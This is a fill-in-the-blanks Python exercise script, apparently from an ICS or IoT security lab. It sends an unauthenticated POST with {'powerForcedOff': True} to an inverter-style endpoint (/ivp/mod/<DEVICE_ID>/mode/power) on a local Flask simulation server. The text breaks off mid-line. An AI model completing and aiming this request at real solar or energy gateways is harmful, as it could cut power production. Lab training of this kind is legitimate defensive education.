import requests
from utils.logger import log_message

# TODO: Set the target URL of the Flask simulation server
TARGET = "http://localhost:____"

# TODO: Set the correct Device ID (603980032)
DEVICE_ID = "__________"  

def run_power_disable_attack():
    log_message('[*] Starting power disable attack...', "INFO")

    # TODO: Send a POST request to disable power production
    # Endpoint format: /ivp/mod/<DEVICE_ID>/mode/power
    # Payload: {"powerForcedOff": True}
    try:
        disable_url = f"{TARGET}/__________/__________/{DEVICE_ID}/__________"
        payload = {"powerForcedOff": True}
        resp = requests.post(disable_url, json=payload)

        if resp.status_code == ____:
            log_message("[+] Power production disabled successfully.", "INFO")
        else:
            log_message(f"[-] Failed to disable power production: {resp.json_
